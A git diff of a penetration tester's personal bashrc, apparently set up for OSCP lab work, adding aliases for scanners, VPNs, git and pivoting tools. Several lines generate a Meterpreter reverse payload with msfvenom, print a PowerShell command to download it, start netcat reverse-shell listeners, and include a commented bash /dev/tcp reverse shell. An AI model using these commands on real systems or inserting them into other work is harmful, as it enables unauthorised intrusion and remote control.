@@ -1,30 +1,171 @@
-#!/bin/bash
+# functions first, so we have no issues later
+function try_source() {
+  [ -f $1 ] &&  source $1 || echo "Could not source $1, does not exist :("
+}
 
-# Alias definitions.
-# You may want to put all your additions into a separate file like
-# ~/.bash_aliases, instead of adding them here directly.
-# See /usr/share/doc/bash-doc/examples in the bash-doc package.
-
-if [ -f $XDG_CONFIG_HOME/bash/aliases ]; then
-    . $XDG_CONFIG_HOME/bash/aliases
+if [[ -n $DISPLAY ]]; then
+  copy_line_to_x_clipboard () {
+    printf %s "$READLINE_LINE" | xclip -selection CLIPBOARD
+  }
+  bind -x '"\C-y": copy_line_to_x_clipboard' # binded to ctrl-y
 fi
 
-if [ -f $XDG_CONFIG_HOME/bash/functions ]; then
-  . $XDG_CONFIG_HOME/bash/functions
-fi
+# aliases
+# alias hx=helix
+alias open=xdg-open
+alias clip="xsel -b"
+alias ll="ls -lh --color=auto"
+alias la="ls -lah --color=auto"
+alias kblaptop="setxkbmap us,de -variant dvorak, -option -option grp:shifts_toggle -option ctrl:nocaps"
+alias kbext="setxkbmap us,de -option -option grp:shifts_toggle -option ctrl:nocaps"
+alias powershell.exe="pwsh"
+alias powershell="pwsh"
+alias hl="highlight -O ansi"
+alias john=~/Tools/john/run/john
 
-# configure rust if available
-CARGO_ENV=$HOME/.cargo/env
-if [[ -f $CARGO_ENV ]]
-then
-  source $CARGO_ENV
-fi
+# python specifics
+alias cvenv='python -m venv --prompt $(basename $PWD) venv && source venv/bin/activate'
+alias avenv='source venv/bin/activate'
+alias pyniceness='pip install --upgrade pip && pip install ipython pdbpp'
 
-LOCAL_PATH=$HOME/.local/bin
-if [[ -d $LOCAL_PATH ]]
-then
-    export PATH=$PATH:$LOCAL_PATH
-fi
+# alias pyserv='sudo python -m http.server 80'
+# wsgidav must run on port 80
+alias serv_wsgi='sudo $(which wsgidav) --host=$(ip_tun) --port=80 --auth=anonymous --root .'
+alias serv_http='cd ~/Tools/server/public && uploadserver -d ~/Tools/server/public'
+alias serv_ligolo='ligolo_proxy -selfcert'
+alias serv_chisel='chisel server -p 8001 --reverse'
+alias serv_smb='sudo smbserver.py -smb2support -username rshell -password Secret123 share .'
+alias serv_rshell='nc -lvp 4444'
 
-export ENNCLAVE_HOME=~/Projects/eNNclave
-export EDITOR=nvim
+# OSCP specifics
+alias ossh='ssh -o StrictHostKeyChecking=no -o IdentitiesOnly=yes'
+alias oscp='scp -o PubkeyAuthentication=no -o PreferredAuthentications=password -o StrictHostKeyChecking=no'
+alias osshuttle='sshuttle -e "ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password -o StrictHostKeyChecking=no"'
+try_source ~/Documents/OSCP/setup.sh
+alias hostsync='sudo cp ~/Documents/OSCP/hosts /etc/hosts'
+
+# scanner analysis
+# utility and generators
+alias ip_tun='ip a sh tun0 | grep -Eo "192\.168.[0-9]+.[0-9]+" | tr -d "\n"' # cutting off the newline enables new abstractions
+export METERPRETER_PORT=1337
+export RSHELL_PORT=4444
+
+alias gen_met='echo "generating meterpreter for $(ip_tun):$METERPRETER_PORT"; msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$(ip_tun) LPORT=$METERPRETER_PORT -f exe -o met.exe'
+alias gen_met_download='echo iwr -uri http://$(ip_tun)/met.exe -Outfile met.exe'
+alias rlisten="rlwrap nc -lvp $RSHELL_PORT"
+# alias gen_rshell_bash="printf 'bash -c "bash -i >& /dev/tcp/%s/$RSHELL_PORT 0>&1"\n' $(ip_tun)"
+
+# analysis shorthands
+alias jq_prowler="jq '[.[] | select(.Status == \"FAIL\") | {desc: .StatusExtended, name: .ServiceName, subname: .SubServiceName}] | unique_by(.desc)'"
+alias jq_trivy="jq '[.Resources[] | .Results[]? | select(.Misconfigurations != null) | {target: .Target, misconfigs: [.Misconfigurations[] | select(.Status == \"FAIL\") | {title: .Title, severity: .Severity, message: .Message}]}]'"
+alias jq_trivy_count="jq '[.Resources[] | .Results[]? | .Misconfigurations[] | select(.Status == \"FAIL\") | group_by(.Severity)]'"
+
+
+## setup commands
+alias setup_ligolo="sudo ip tuntap add user alex mode tun ligolo; sudo ip link set ligolo up"
+alias setup_git_priv="git config user.name 'Alex Schlögl';git config user.email 'alxshine@proton.me'"
+
+alias scan_sem_quick='semgrep scan --config auto --sarif --output semgrep_quick.sarif'
+alias scan_sem_entry='semgrep --config ~/Tools/semgrep-rules/rules-audit --sarif --output semgrep_audit.sarif'
+alias scan_sem_tob_rs='semgrep scan --config ~/Tools/semgrep-rules-tob/rs --sarif --output semgrep_tob_rs.sarif'
+alias scan_sem_tob_js='semgrep scan --config ~/Tools/semgrep-rules-tob/javascript --sarif --output semgrep_tob_js.sarif'
+alias scan_ql_db='codeql database create codeql_db'
+alias scan_ql_analyze='codeql database analyze codeql_db/ --format=sarif-latest --output=codeql_default.sarif'
+alias scan_osv='osv-scanner scan -f sarif --output scan_osv.sarif .'
+
+# ctf scanners
+alias scan_gobuster_common='gobuster dir -w ~/Tools/wordlists/dirb/common.txt -u'
+alias scan_gobuster_big='gobuster dir -w ~/Tools/wordlists/dirb/big.txt -u'
+
+
+alias vpn_oscp="sudo openvpn --config ~/Documents/OSCP/universal.ovpn"
+alias vpn_htb="sudo openvpn --config ~/Documents/lab_alxshine.ovpn"
+
+## weaudit CLI
+alias wra="weaudit review add"
+alias next_20='weaudit review list > audited.log && diff all.log audited.log | rg \< | cut -d" " -f2 | head -n 20'
+
+## git aliases
+alias gp='git push'
+alias gc='git commit'
+alias gl='git pull'
+alias gf='git fetch'
+alias ga="git add"
+alias gst="git status"
+alias grb="git rebase"
+alias gd="git diff"
+alias push_all="git remote | parallel git push"
+
+## config
+# export VISUAL=helix
+export VISUAL=hx
+
+## functions
+check_host() {
+    if [[ $# -ne 1 ]]; then
+        printf "Usage: $0 ssh_target\n"
+        return 1
+    fi
+
+    ssh -o ConnectTimeout=1 $1 'exit' 2>/dev/null
+}
+
+wait_host() {
+    if [[ $# -ne 1 ]]; then
+        printf "Usage: $0 ssh_target\n"
+        return 1
+    fi
+
+    while ! check_host $1; do
+        sleep 3
+    done
+}
+
+alias zp='cd ~/Projects/pentesting/$(ls ~/Projects/pentesting | fzf || echo -n "")'
+alias zr='cd ~/Projects/$(ls ~/Projects | fzf || echo -n "$HOME")'
+# zp() {
+#     BASE_PATH="$HOME/Projects/pentesting"
+#     chosen=`ls $BASE_PATH | fzf`
+
+#     if [[ $? -eq 0 ]] ; then
+#         cd ${BASE_PATH}/$chosen
+#     fi
+# }
+
+cr() {
+  toplevel=$(git rev-parse --show-toplevel)
+  if [ -z $toplevel ]; then
+    echo "Not in a git repository"
+  else
+    cd $toplevel
+  fi
+}
+
+function join_by {
+  # taken with gratitude from https://stackoverflow.com/questions/1527049/how-can-i-join-elements-of-a-bash-array-into-a-delimited-string
+  local d=${1-} f=${2-}
+  if shift 2; then
+    printf %s "$f" "${@/#/$d}"
+  fi
+}
+
+# work stuff moved out
+try_source ~/.bashrc_work.sh
+
+try_source ~/.fzf.bash
+# custom completions go here
+try_source ~/.config/bash/completions/gobuster.sh
+try_source ~/.config/bash/completions/kubescape.sh
+try_source ~/.config/bash/completions/weaudit.sh
+
+# gcloud
+# export PATH="/opt/google-cloud-cli/bin:$PATH"
+# try_source /opt/google-cloud-cli/completion.bash.inc
+
+# pnpm
+export PNPM_HOME="/home/alex/.local/share/pnpm"
+case ":$PATH:" in
+  *":$PNPM_HOME:"*) ;;
+  *) export PATH="$PNPM_HOME:$PATH" ;;
+esac
+# pnpm end
